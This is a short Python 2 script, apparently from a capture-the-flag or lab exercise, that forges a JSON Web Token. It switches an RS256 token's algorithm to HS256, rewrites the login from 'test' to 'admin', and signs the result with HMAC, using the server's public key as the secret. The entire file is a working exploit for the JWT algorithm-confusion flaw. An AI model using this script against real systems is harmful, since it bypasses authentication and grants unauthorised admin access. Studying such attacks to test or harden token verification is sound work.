import base64
import hmac
import hashlib
import binascii


def create_sha256_signature(key, message):
    message = message.encode()
    return hmac.new(key, message, hashlib.sha256).hexdigest().upper()

with open('public.pem') as fp:
    secret = fp.read()
#secret = secret.replace("\n","").replace("-----END PUBLIC KEY-----","").replace("-----BEGIN PUBLIC KEY-----","").replace(" ","")
print secret
cookie = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3QifQ.ZabKsEue5gDPyvwNnS8Xned104AR5V4LFaM4ApaLM9OvG2SEQbiiOwLvwFXM0mqAI7xoJXDosbjvNFzz21rthQDZseZkrw9Ogebbxr6b14wO6p64VQV0siBKroL_xWa8o5chkSru1kEEHAsEm5CaZvQlhshDvZc0gf-_eE0ZPudVO2j3ie_70dEqVCQJ5d86iYp5Ob0SRJdjpXNnYcmFnj9KOLnuM6TGzYExWqVRw2II2Iovjahq0IjacnnO47Hpixe8YHuTVZtzDTNLcqGvslNxYAq2efMWLktqM6rOU5k-CrtqVV3vc1bgcXmTOCI2_3FsnDQ2_hssWaocA18EEw"

header, data, signature = cookie.split(".")

header =  base64.b64decode(header).replace("RS256","HS256")
data =  base64.b64decode(data+"==")
data = data.replace("test","admin")
print header
print data
header_data = base64.b64encode(header).replace("=","")+'.'+base64.b64encode(data).replace('=','');

signature = base64.urlsafe_b64encode(hmac.new(secret, header_data, hashlib.sha256).digest())
print header_data+'.'+signature


#print "".join("\\x{:02x}".format(ord(ch)) for ch in base64.b64decode(signature+"=="))




